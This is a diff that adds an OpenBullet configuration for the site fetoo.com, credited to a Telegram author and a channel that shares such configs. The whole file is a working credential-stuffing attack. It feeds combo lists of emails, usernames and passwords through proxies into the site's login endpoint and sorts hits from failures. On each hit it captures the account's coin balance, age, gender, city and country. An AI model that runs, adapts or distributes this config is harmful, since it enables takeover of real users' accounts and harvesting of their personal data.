@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "fetoo.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-03T19:07:58.542616+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST POST "https://www.fetoo.com/ajax/get-tracking-code" 
+  CONTENT "{\"\":\"\",\"referrer\":\"\",\"url\":\"https://www.fetoo.com/en-US/\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.fetoo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.fetoo.com/en-US/" 
+  HEADER "Origin: https://www.fetoo.com" 
+  HEADER "Connection: close" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<COOKIES(visitorIdfa)>" DoesNotExist 
+
+#login REQUEST POST "https://www.fetoo.com/en-US/login" EncodeContent=TRUE 
+  CONTENT "_token=<COOKIES(visitorIdfa)>&trk=&ident=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.fetoo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://www.fetoo.com" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://www.fetoo.com/en-US/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login incorrect!" 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+
+#Get REQUEST GET "https://www.fetoo.com/ajax/account" 
+  
+  HEADER "Host: www.fetoo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.fetoo.com/en-US/app" 
+  HEADER "Connection: close" 
+
+#Coins PARSE "<SOURCE>" LR "coins\":" "," CreateEmpty=FALSE -> CAP "Coins" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Coins>" EqualTo "0" 
+
+#Age PARSE "<SOURCE>" LR "age\":" "," CreateEmpty=FALSE -> CAP "Age" 
+
+#G PARSE "<SOURCE>" LR "gender\":" "," -> VAR "G" 
+
+#Gender FUNCTION Translate 
+  KEY "2" VALUE "Male" 
+  KEY "1" VALUE "Female" 
+  "<G>" -> CAP "gender" 
+
+#city PARSE "<SOURCE>" LR "city\":\"" "\"" CreateEmpty=FALSE -> CAP "city" 
+
+#country PARSE "<SOURCE>" LR "country\":\"" "\"" CreateEmpty=FALSE -> CAP "country" 
+
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
